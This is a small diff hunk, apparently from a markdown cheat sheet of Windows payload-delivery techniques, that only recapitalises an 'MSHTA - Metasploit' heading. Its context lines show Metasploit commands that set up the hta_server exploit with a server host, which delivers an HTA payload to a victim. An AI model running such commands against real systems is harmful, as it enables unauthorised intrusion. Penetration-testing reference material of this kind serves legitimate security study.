@@ -285,7 +285,7 @@ MSHTA - SCT
 </script>
 </scriptlet>
 ```
-Mshta - Metasploit
+MSHTA - Metasploit
 ```
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
